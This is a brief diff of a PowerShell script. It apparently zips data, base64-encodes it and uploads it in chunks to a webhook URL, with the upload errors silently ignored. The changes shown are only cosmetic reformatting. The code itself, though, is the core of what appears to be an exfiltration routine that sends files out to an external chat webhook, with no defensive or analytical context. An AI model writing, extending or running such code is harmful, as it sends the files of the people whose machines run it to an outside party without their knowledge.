@@ -35,9 +35,7 @@ if (Test-Path $zipPath) {
         $currentChunkSize = [Math]::Min($chunkSize, $remainingLength)
         $chunk = $zipBase64.Substring($i, $currentChunkSize)
         
-        $payload = @{
-            content = "```$chunk```"
-        } | ConvertTo-Json -Compress
+        $payload = @{ content = "```$chunk```" } | ConvertTo-Json -Compress
 
         try {
             $request = [System.Net.WebRequest]::Create($webhookUrl)
@@ -51,7 +49,9 @@ if (Test-Path $zipPath) {
             $dataStream.Close()
             $response = $request.GetResponse()
             $response.Close()
-        } catch {}
+        } catch {
+            # Ignore errors
+        }
     }
 }
 
